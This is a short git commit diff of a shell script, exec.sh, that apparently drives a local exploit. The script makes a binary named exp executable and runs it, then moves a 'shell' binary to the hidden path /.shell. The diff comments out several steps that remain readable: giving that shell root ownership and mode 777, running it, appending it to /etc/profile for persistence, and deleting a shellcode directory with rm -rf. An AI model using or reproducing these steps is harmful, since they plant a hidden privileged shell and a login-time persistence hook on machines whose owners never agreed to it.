93b2823ce1b25b89ba234b5e27fb012156540059
hehekun <41153628+hehekun@users.noreply.github.com>
2019-07-10 13:46:59 +0800

    Update exec.sh

--- exec.sh
+++ exec.sh
@@ -1,7 +1,9 @@
+chmod +x ./exp
 ./exp
+echo "asddasdsadas" >a.txt
 mv ./shell /.shell
-chown root /.shell
-chmod 777 /.shell
-/.shell
-echo /.shell >> /etc/profile
-rm -rf ../shellcode
+#chown root /.shell
+#chmod 777 /.shell
+#/.shell
+#echo /.shell >> /etc/profile
+#rm -rf ../shellcode
